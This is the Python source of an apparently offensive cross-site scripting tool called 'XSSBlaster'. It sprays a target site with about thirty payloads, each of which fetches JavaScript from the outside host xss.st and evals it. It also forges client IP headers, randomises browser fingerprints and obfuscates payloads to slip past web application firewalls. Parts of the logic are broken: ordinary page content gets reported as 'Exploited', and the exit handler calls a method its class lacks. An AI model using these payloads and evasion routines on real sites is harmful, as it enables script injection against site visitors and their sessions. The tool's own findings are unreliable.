import requests
import re
import signal
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, quote
import ssl
import certifi
from concurrent.futures import ThreadPoolExecutor
import argparse
import time
import sys
import platform
import random
import json
from datetime import datetime
import logging
from colorama import init, Fore, Style
import socket
import base64
import hashlib
import zlib
import urllib3
import threading
import queue
import os
import uuid
import dns.resolver
import brotli
import chardet

init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XSSBlaster:
    class Core:
        def __init__(self, target_url, delay=2, proxy=None, report_file=None, threads=5, verbose=False, count_success=False):
            signal.signal(signal.SIGINT, lambda sig, frame: self._handle_exit())
            self.target = target_url if target_url.startswith('http') else f'https://{target_url}'
            self.vulnerabilities = []
            self.delay = delay
            self.proxy = proxy
            self.report_file = report_file or f"xssblaster_report_{uuid.uuid4().hex[:8]}.json"
            self.threads = threads
            self.verbose = verbose
            self.count_success = count_success
            self.success_count = 0
            self.payloads = [
                "<script>fetch('xss.st/a').then(r=>eval(r.text()))</script>",
                "<img src=x onerror=fetch('xss.st/b').then(r=>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')))>",
                "<svg onload=fetch('xss.st/c').then(r=>Function(r.text())())>",
                "javascript:fetch('xss.st/d').then(r=>eval('al'+'ert(1)'))",
                "<iframe srcdoc='<script>fetch(`xss.st/e`).then(r=>eval(r.text()))</script>'>",
                "<video><source onerror=fetch('xss.st/f').then(r=>new Function(r.text())())>",
                "<object data=\"javascript:fetch('xss.st/g').then(r=>eval(r.text()))\">",
                "<script/src=data:,fetch('xss.st/h').then(r=>eval(r.text()))>",
                "<input autofocus onfocus=fetch('xss.st/i').then(r=>eval(this.value))>",
                "<meta http-equiv=refresh content=\"0;url=javascript:fetch('xss.st/j').then(r=>eval(r.text()))\">",
                "<style>@import'javascript:fetch(\"xss.st/k\").then(r=>eval(r.text()))';</style>",
                "<script>document.write('<img src=x onerror=fetch(\"xss.st/l\").then(r=>eval(r.text()))>')</script>",
                "<details ontoggle=fetch('xss.st/m').then(r=>eval(r.text()))>",
                "<template><script>fetch('xss.st/n').then(r=>setInterval(r.text(),1))</script></template>",
                "<marquee onstart=fetch('xss.st/o').then(r=>eval('al'+'ert(document.domain)'))>",
                "<keygen onfocus=fetch('xss.st/p').then(r=>eval(r.text()))>",
                "<embed src=\"javascript:fetch('xss.st/q').then(r=>eval(r.text()))\">",
                "<audio src=x onloadstart=fetch('xss.st/r').then(r=>eval(r.text()))>",
                "<form><button formaction=\"javascript:fetch('xss.st/s').then(r=>eval(r.text()))\">",
                "<svg><script>fetch('xss.st/t').then(r=>eval('al'+'ert(navigator.userAgent)'))</",
                "<img src=x onerror=fetch('xss.st/u').then(r=>eval(btoa(r.text())))>",
                "<script>new Function(atob('ZmV0Y2goJ3hzcy5zdC92JykudGhlbihyPT5ldmFsKHIudGV4dCgpKSk='))()</script>",
                "<link rel=import href=\"data:text/html,<script>fetch('xss.st/w').then(r=>eval(r.text()))</script>\">",
                "<body onresize=fetch('xss.st/x').then(r=>eval('fe'+'tch(\"xss.st/y\")'))>",
                "<script>fetch('xss.st/z').then(r=>r.text().split('').map(c=>String.fromCharCode(c.charCodeAt(0)^1)).join('')).then(eval)</script>",
                "<dialog open onclose=fetch('xss.st/aa').then(r=>eval(r.text()))>",
                "<script>fetch('xss.st/ab').then(r=>crypto.subtle.digest('SHA-256',new TextEncoder().encode(r.text())).then(h=>eval(h)))</script>",
                "<img src=x onerror=fetch('xss.st/ac').then(r=>eval(r.text().match(/.{1,2}/g).map(x=>String.fromCharCode(parseInt(x,16))).join('')))>",
                "<svg/onload=fetch('xss.st/ad').then(r=>eval(r.text().split('').reverse().join('')))>",
            ]
            self.headers = self._generate_stealth_headers()
            self.task_queue = queue.Queue()
            self.lock = threading.Lock()
            logging.basicConfig(level=logging.DEBUG if verbose else logging.INFO, format='%(message)s')
            self.logger = logging.getLogger("XSSBlaster")
            self.start_time = time.time()
            self.dns_cache = {}
            self.ip_rotator = []
            self.fuzz_vectors = []
            self.waf_bypass_queue = queue.Queue()
            self.session = requests.Session()
            self.session.verify = False

        def _generate_stealth_headers(self):
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
            ]
            return {
                "User-Agent": random.choice(user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": random.choice(["en-US,en;q=0.5", "zh-CN,zh;q=0.9", "de-DE,de;q=0.8", "ru-RU,ru;q=0.7"]),
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "no-store",
                "Referer": random.choice(["https://x.com/", "https://reddit.com/", "https://github.com/", "https://news.ycombinator.com/"]),
                "DNT": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "X-Forwarded-For": self._generate_random_ip(),
                "X-Real-IP": self._generate_random_ip(),
                "Via": f"2.0 proxy{random.randint(1000,9999)}.ghost",
                "X-Client-Data": base64.b64encode(os.urandom(16)).decode(),
                "X-Requested-With": "Fetch",
                "X-CSRF-Token": hashlib.sha256(os.urandom(32)).hexdigest(),
                "X-Source-ID": uuid.uuid4().hex,
                "X-Scanner": "XSSBlaster-Stealth",
            }

        def _generate_random_ip(self):
            return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

        def _print_colored(self, text, color):
            with self.lock:
                print(f"{color}{text}{Style.RESET_ALL}")
                self.logger.info(text)

        def _dns_lookup(self, hostname):
            if hostname in self.dns_cache:
                return self.dns_cache[hostname]
            try:
                answers = dns.resolver.resolve(hostname, 'A')
                ips = [str(answer) for answer in answers]
                self.dns_cache[hostname] = ips
                self.ip_rotator.extend(ips)
                return ips
            except:
                return [socket.gethostbyname(hostname)]

        def fetch_page(self, url):
            proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else None
            try:
                hostname = urlparse(url).hostname
                self._dns_lookup(hostname)
                response = self.session.get(url, headers=self.headers, proxies=proxies, timeout=30)
                encoding = chardet.detect(response.content)["encoding"] or "utf-8"
                if "br" in response.headers.get("Content-Encoding", ""):
                    content = brotli.decompress(response.content).decode(encoding, errors='ignore')
                else:
                    content = response.content.decode(encoding, errors='ignore')
                return content, response.status_code
            except:
                return None, "Connection Failure"

        def _fingerprint_target(self, html):
            soup = BeautifulSoup(html, 'lxml')
            return {
                "forms": len(soup.find_all('form')),
                "scripts": len(soup.find_all('script')),
                "inputs": len(soup.find_all('input')),
                "links": len(soup.find_all('a')),
                "hash": hashlib.blake2b(html.encode(), digest_size=16).hexdigest(),
                "size": len(html),
            }

        def _encode_payload(self, payload):
            encodings = [
                lambda x: quote(x, safe=''),
                lambda x: base64.b64encode(x.encode()).decode(),
                lambda x: ''.join([hex(ord(c))[2:].zfill(4) for c in x]),
                lambda x: brotli.compress(x.encode()).hex(),
                lambda x: ''.join([chr(ord(c) ^ 0xAA) for c in x]),
                lambda x: x.encode('utf-32').hex(),
            ]
            return random.choice(encodings)(payload)

        def test_payload(self, url, param, payload, context="param"):
            test_url = f"{url}?{param}={self._encode_payload(payload)}" if context == "param" else f"{url}/{quote(payload)}"
            proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else None
            try:
                time.sleep(random.uniform(self.delay, self.delay * 2))
                self._ip_rotate()
                response = self.session.get(test_url, headers=self.headers, proxies=proxies, timeout=25, allow_redirects=False)
                content = response.text.lower()
                headers = str(response.headers).lower()
                
                detections = {
                    "reflected": payload.lower() in content,
                    "js_exec": any(x in content for x in ["fetch(", "eval(", "alert(", "function("]),
                    "attr_inject": any(x in content + headers for x in ["onload=", "onerror=", "javascript:", "data:"]),
                    "cookie_leak": "document.cookie" in content,
                    "remote_call": "xss.st" in content,
                    "header_taint": payload.lower() in headers,
                }
                if any(detections.values()):
                    with self.lock:
                        self.success_count += 1
                    return {
                        "finding": f"[XSS] Exploited: {test_url}",
                        "payload": payload,
                        "context": context,
                        "detections": detections,
                        "response_time": response.elapsed.total_seconds(),
                        "status": response.status_code,
                        "content_length": len(response.content),
                        "server": response.headers.get("Server", "Unknown"),
                        "ip": random.choice(self.ip_rotator) if self.ip_rotator else "Unknown",
                    }
            except:
                return None
            return None

        def extract_params_and_attributes(self, html):
            parsed = urlparse(self.target)
            params = dict(parse_qs(parsed.query))
            soup = BeautifulSoup(html, 'lxml')
    
            attr_priority = {'name', 'id', 'value', 'href', 'src', 'action', 'data-'}
            for tag in soup.find_all(True):
                tag_attrs = set(tag.attrs.keys())
                relevant_attrs = tag_attrs.intersection(attr_priority) or tag_attrs
        
                for attr in relevant_attrs:
                    value = tag.get(attr, '')
                    if attr.startswith('data-') or attr in attr_priority:
                        if value:
                            if value in params:
                                if '' not in params[value]:
                                    params[value].append('')
                            else:
                                params[value] = ['']
                        if not value and tag.string:
                            params[tag.string.strip()] = ['']
    
            attributes = []
            event_handlers = set(f'on{event}' for event in [
                'click', 'load', 'mouseover', 'submit', 'change', 'focus', 'blur', 'key'
            ])
    
            for tag in soup.find_all(True):
                for attr in tag.attrs:
                    if (attr in event_handlers or 
                        re.match(r'^(href|src|action|data-\w+)$', attr) or
                        (attr == 'id' and tag.get('id') in html) or
                        (attr == 'class' and any('script' in c for c in tag.get('class', [])))):
                        attributes.append((tag.name, attr))
                
                if tag.name in ['script', 'style'] and tag.string:
                    params[tag.string.strip()] = ['']
    
            return dict(sorted(params.items())), sorted(set(attributes))

        def _worker(self):
            while True:
                try:
                    task = self.task_queue.get_nowait()
                    url, param, payload, context = task
                    result = self.test_payload(url, param, payload, context)
                    if result:
                        with self.lock:
                            self.vulnerabilities.append(result)
                            self._print_colored(f"[!] {result['finding']}", Fore.RED)
                    self.task_queue.task_done()
                except queue.Empty:
                    break

        def _simulate_waf_bypass(self):
            techniques = [
                lambda x: x.replace("<", "%3C").replace(">", "%3E"),
                lambda x: f"/*{x}*/",
                lambda x: x.replace("fetch", "fe"+"tch").replace("eval", "ev"+"al"),
                lambda x: brotli.compress(x.encode()).hex() + ";eval(decode(this))",
                lambda x: ''.join([c + chr(random.randint(0, 15)) for c in x]),
                lambda x: x.encode('utf-16be').hex(),
            ]
            return random.choice(techniques)

        def _cache_buster(self, url):
            return f"{url}&_={random.randint(100000,999999)}" if "?" in url else f"{url}?_={random.randint(100000,999999)}"

        def _ip_rotate(self):
            if self.ip_rotator:
                self.headers["X-Forwarded-For"] = random.choice(self.ip_rotator)

        def _fuzz_params(self, params):
            fuzz = ["<script>", "xss", "1;fetch('xss.st')", "null/**/", "'\"<svg onload=alert(1)>"]
            for p in params.keys():
                for f in fuzz:
                    self.fuzz_vectors.append((p, f))

        def run_xss_scan(self):
            self._print_colored(f"[*] Target Locked: {self.target}", Fore.CYAN)
            html, status = self.fetch_page(self.target)
            if not html:
                return [{"finding": f"[Error] Target Down: {status}", "payload": None, "context": None}]

            fingerprint = self._fingerprint_target(html)
            self._print_colored(f"[*] Fingerprint: Forms={fingerprint['forms']}, Scripts={fingerprint['scripts']}", Fore.BLUE)

            params, attributes = self.extract_params_and_attributes(html)
            if not params and not attributes:
                return [{"finding": "[Info] No Targets", "payload": None, "context": None}]

            self._fuzz_params(params)
            for param in params.keys():
                for payload in self.payloads:
                    self.task_queue.put((self._cache_buster(self.target), param, self._simulate_waf_bypass()(payload), "param"))
            
            for tag, attr in attributes:
                for payload in self.payloads:
                    self.task_queue.put((self._cache_buster(self.target), f"{tag}_{attr}", self._simulate_waf_bypass()(payload), "attribute"))

            for fuzz_param, fuzz_value in self.fuzz_vectors:
                self.task_queue.put((self._cache_buster(self.target), fuzz_param, fuzz_value, "fuzz"))

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                executor.map(lambda t: self._worker(), [None] * self.task_queue.qsize())

            self._generate_report()
            return self.vulnerabilities if self.vulnerabilities else [{"finding": "[Safe] No Exploits", "payload": None, "context": None}]

        def _generate_report(self):
            report = {
                "target": self.target,
                "timestamp": datetime.now().isoformat(),
                "vulnerabilities": self.vulnerabilities,
                "total_tests": self.task_queue.qsize(),
                "scan_duration": f"{time.time() - self.start_time:.2f}s",
                "success_count": self.success_count,
            }
            with open(self.report_file, 'wb') as f:
                f.write(brotli.compress(json.dumps(report, indent=2).encode()))
            self._print_colored(f"[*] Report Saved: {self.report_file}", Fore.GREEN)
        def _export_html_report(self):
            html_content = f"""
            <html>
                <head>
                    <title>XSSBlaster - {self.target}</title>
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-900 text-white font-mono p-6">
                <h1 class="text-3xl font-bold mb-4">XSSBlaster Report</h1>
                <p class="mb-2">Target: {self.target}</p>
                <p class="mb-4">Tests: {self.task_queue.qsize()}</p>
                <h2 class="text-2xl font-semibold mt-6 mb-3">Findings</h2>
            """
            for vuln in self.vulnerabilities:
                html_content += f"<p class='vuln'>{vuln['finding']}<br>Payload: {vuln['payload']}</p>"
            html_content += "</body></html>"
            html_file = self.report_file.replace('.json', '.html')
            with open(html_file, 'w') as f:
                f.write(html_content)
            self._print_colored(f"[*] HTML Report: {html_file}", Fore.GREEN)

    def _handle_exit(self):
        self._print_colored("[*] Shutting Down...", Fore.YELLOW)
        self.core._generate_report()
        self.core._export_html_report()
        sys.exit(0)

    def __init__(self, target_url, delay=2, proxy=None, report_file=None, threads=5, verbose=False, count_success=False):
        self.core = self.Core(target_url, delay, proxy, report_file, threads, verbose, count_success)

    def scan(self):
        results = self.core.run_xss_scan()
        self.core._export_html_report()
        for result in results:
            self.core._print_colored(result["finding"], Fore.GREEN if "[Safe]" in result["finding"] else Fore.RED)
logo = """

    ██   ██ ███████ ███████       ██████  ██       █████  ███████ ████████ ███████ ██████  
     ██ ██  ██      ██            ██   ██ ██      ██   ██ ██         ██    ██      ██   ██ 
      ███   ███████ ███████ █████ ██████  ██      ███████ ███████    ██    █████   ██████  
     ██ ██       ██      ██       ██   ██ ██      ██   ██      ██    ██    ██      ██   ██ 
    ██   ██ ███████ ███████       ██████  ███████ ██   ██ ███████    ██    ███████ ██   ██


             ░▒▓█►─═ Innovatively Engineered and Perfected by ishakdev ═─◄█▓▒░                                                                                
"""
print(Fore.RED + Style.BRIGHT + logo + Style.RESET_ALL)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"{Fore.CYAN}XSSBlaster{Style.RESET_ALL}")
    
    # Print argument descriptions with colors, but keep the actual argument names uncolored
    parser.add_argument("target", help=f"{Fore.MAGENTA}Target URL{Style.RESET_ALL}")
    parser.add_argument("-xss", action="store_true", help=f"{Fore.GREEN}Enable XSS Mode{Style.RESET_ALL}")
    parser.add_argument("-s", type=float, default=2, help=f"{Fore.GREEN}Sleep time between requests (default: 2s){Style.RESET_ALL}")
    parser.add_argument("-p", "--proxy", help=f"{Fore.GREEN}Proxy URL (e.g., http://127.0.0.1:8080){Style.RESET_ALL}")
    parser.add_argument("-r", "--report", help=f"{Fore.GREEN}Path to save the XSS scan report{Style.RESET_ALL}")
    parser.add_argument("-t", "--threads", type=int, default=5, help=f"{Fore.GREEN}Number of threads (default: 5){Style.RESET_ALL}")
    parser.add_argument("-v", "--verbose", action="store_true", help=f"{Fore.GREEN}Enable verbose output{Style.RESET_ALL}")
    parser.add_argument("-c", "--count", action="store_true", help=f"{Fore.GREEN}Count detected vulnerabilities{Style.RESET_ALL}")

    args = parser.parse_args()
    if not args.xss:
        print("Use -xss to start")
        sys.exit(1)
    
    scanner = XSSBlaster(args.target, args.s, args.proxy, args.report, args.threads, args.verbose, args.count)
    scanner.scan()
